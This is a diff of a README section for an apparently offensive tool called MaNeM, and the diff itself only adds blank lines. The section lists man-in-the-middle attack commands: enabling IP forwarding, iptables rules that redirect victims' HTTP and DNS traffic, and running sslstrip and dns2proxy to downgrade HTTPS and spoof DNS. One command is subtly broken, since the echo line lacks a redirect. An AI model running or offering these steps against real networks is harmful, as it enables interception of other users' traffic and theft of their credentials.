@@ -28,12 +28,17 @@ $ python3 MaNeM
 #### What to do when using man in the middle tool
 
 $ echo 1 /proc/sys/net/ipv4/ip_forward
+
 $ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
 $ iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+
 $ sudo sslstrip
+
 $ python dns2proxy
 
 ##### Other
+
 - If apt isntall python3-xyz doesn't work for you, use the normal pip or pip3 installer
 - Run MaNeM framework in another window to use the packet listener when using the MITM tool
 - How to use the rest of the tool are demonstrated as you engage with the MaNeM framework
